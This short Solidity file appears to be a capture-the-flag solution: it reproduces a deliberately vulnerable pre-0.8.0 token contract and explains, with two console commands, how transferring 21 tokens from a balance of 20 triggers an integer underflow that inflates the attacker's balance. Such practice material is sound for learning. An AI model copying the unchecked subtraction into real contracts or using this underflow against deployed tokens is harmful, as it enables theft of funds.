// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: The goal of this level is for you to hack the basic token contract below.
//		 You are given 20 tokens to start with and you will beat the level if you 
//		 somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}


//SOLUTION
//- understand over- and underflows (which are not existing after Solidity after 0.8.0 anymore, so always check Sol version)
//- call transfer function, pass the requirement and create an underflow in the balances mapping
//- to create an underflow we transfer more tokens than we have (which still passes the check)
//- we own 20 token, so we send 21 (to any address). We then have a looooot of tokens :)

// await contract.transfer("0xcc0F3d7C35ec81Bf31cce91b45a37871fEB9c0b4", 21)
// await contract.balanceOf("0x1cA1A73112187C54DF8025b3A0607f4DD6b924fD").then(function(result){return result.toString()})